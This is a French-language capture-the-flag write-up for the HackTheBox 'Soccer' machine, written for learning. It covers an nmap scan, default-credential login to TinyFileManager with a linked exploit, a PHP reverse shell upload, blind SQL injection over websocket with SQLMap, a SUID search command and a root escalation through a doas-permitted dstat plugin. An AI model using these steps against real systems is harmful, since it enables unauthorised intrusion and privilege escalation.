# Soccer - easy

```yaml
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-28 18:09 EST                                                                               
Nmap scan report for 10.10.11.194                                                                                                             
Host is up (0.057s latency).                                                                                                                  
Not shown: 997 closed tcp ports (conn-refused)                                                                                                
PORT     STATE SERVICE         VERSION                                                                                                        
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)                                                   
| ssh-hostkey:                                                                                                                                
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)                                                                                
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)                                                                               
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)                                                                             
80/tcp   open  http            nginx 1.18.0 (Ubuntu)                                                                                          
|_http-server-header: nginx/1.18.0 (Ubuntu)                                                                                                   
|_http-title: Did not follow redirect to http://soccer.htb/                                                                                   
9091/tcp open  xmltec-xmlmail?
```

découverte de [http://soccer.htb/tiny/](http://soccer.htb/tiny/) grâce à un gobuster

Le site utilise donc TinyFileManager "2.4.3”, on trouve un exploit sauf qu’il est authenticated, il faut donc trouver un moyen de se log

[https://github.com/febinrev/tinyfilemanager-2.4.3-exploit](https://github.com/febinrev/tinyfilemanager-2.4.3-exploit)

Les credentials par défaut sont utilisés : [https://github.com/prasathmani/tinyfilemanager](https://github.com/prasathmani/tinyfilemanager)

On essaye alors d’upload un reverse shell php, cela ne marche pas à cause du manque de droit pour écrire dans le dossier du site, on se replie sur l’exploit

```yaml
./exploit.sh http://soccer.htb/tiny/ admin admin@123         │
/usr/bin/curl                                                          │
[✔] Curl found!                                                        │
/usr/bin/jq                                                            │
[✔] jq found!                                                          │
                                                                       │
[+]  Login Success! Cookie: filemanager=tuluulf5ijftelqskcd23en320     │
                                                                       │
[*] Try to Leak Web root directory path                                │
                                                                       │
[+] Found WEBROOT directory for tinyfilemanager using full path disclos│
ure bug : /var/www/html/tiny/                                          │
                                                                       │
[-] File Upload Unsuccessful! Exiting!
```

Possibilité d’upload dans le dossier uploads

succés !

Un sous domaine se cache dans /etc/hosts

après avoir créé un compte bidon on peut consulter la page

[http://soc-player.soccer.htb/check](http://soc-player.soccer.htb/check) avec un système de ticket dessus, peut être qu’il utile SQL ??

Analyse avec burp suite: système d’id avec [http://soc-player.soccer.htb/check?id=1](http://soc-player.soccer.htb/check?id=1)

Utilisation de websocket dans le code de la fonction check dans le code source de la page:

[https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html)

On utilise SQLMap pour dump la table avec les creds de soccer et on entre en ssh, on obtient le flag user.

```php
find / -perm -4000 2>/dev/null
```

→ on trouve un executable bizarre en SUID: doas

Dans le fichier de conf de doas 

```php
permit nopass player as root cmd /usr/bin/dstat
```

Après recherche il se trouve que l’on peut des plugins dans le répertoire dstat local

On crée un plugin python qui lance simplement un bash

Il suffit ensuite d’executer tout ça en tant que root

```php
doas -u root /usr/bin/dstat --privesc
```

On obtient le flag root !